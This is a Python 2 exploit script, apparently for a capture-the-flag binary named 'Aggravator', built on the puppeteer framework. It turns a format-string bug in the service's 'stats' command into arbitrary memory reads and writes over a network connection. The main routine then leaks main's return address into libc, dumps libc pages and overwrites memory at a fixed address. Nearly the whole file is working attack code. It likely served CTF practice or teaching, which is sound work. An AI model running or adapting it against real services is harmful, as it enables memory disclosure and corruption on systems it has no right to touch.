import puppeteer

import logging

class Aggravator(puppeteer.Manipulator):
    def __init__(self, host, port):
        puppeteer.Manipulator.__init__(self, puppeteer.x86)

        # some initial info from IDA
        # TODO: maybe use IDALink to get this automatically?
        self.locations['main'] = 0x0804A9B3
        self.locations['#main_end'] = 0x0804A9D1
        self.info['main_stackframe_size'] = 0x24

        self.c = puppeteer.Connection(host=host, port=port)
        self.c.read_until("> ")

    @puppeteer.printf_flags(byte_offset=244, max_length=31, forbidden={'\x00', '\x0a'})
    def stats_printf(self, fmt):
        self.c.send("stats " + fmt + "\n")
        self.c.read_until("kill top:\n")
        try:
            result = self.c.read_until("\n"*5, timeout=3)[:-5]
            self.c.read_until("> ", timeout=3)
        except EOFError:
            print "Program didn't finish the print"
            return ""

        #print "GOT:",repr(result)
        return result

def main():
    logging.getLogger("puppeteer.manipulator").setLevel(logging.DEBUG)
    #logging.getLogger("puppeteer.utils").setLevel(logging.DEBUG)
    #logging.getLogger("puppeteer.formatter").setLevel(logging.DEBUG)

    # Create the Aggravator!
    a = Aggravator(sys.argv[1], int(sys.argv[2]))

    # And now, we can to stuff!

    # We can read the stack!
    #print "STACKZ",a.read_stack(1000).encode('hex')

    #print "LOOK WHAT WE CAN READ!!", a.do_memory_read(0x0804AAAA, 20)

    ## We can figure out where __libc_start_main is!
    lcsm = a.main_return_address(start_offset=390)
    print "main() will return to (presumably, this is in libc):",hex(lcsm)

    # now dump it!
    libc = a.dump_pageset(lcsm) #- 0x1000 # the minus is because on my test machine, the address has a \x00 in it
    print "dumped %d pages from libc" % len(libc)

    # We can overwrite memory with ease!
    a.do_memory_write(0x0804C344, "OK")
    assert a.do_memory_read(0x0804C344, 2) == "OK"
    a.c.send("quit\n")

    #libc_page_start = lcsm & 0xfffff000
    #libc_page_content = a.do_memory_read(libc_page_start, 0x1000)
    #open("dumped", "w").write(libc_page_content)
    #print "read out %d bytes from libc!" % len(libc_page_content)

if __name__ == '__main__':
    import sys
    main()
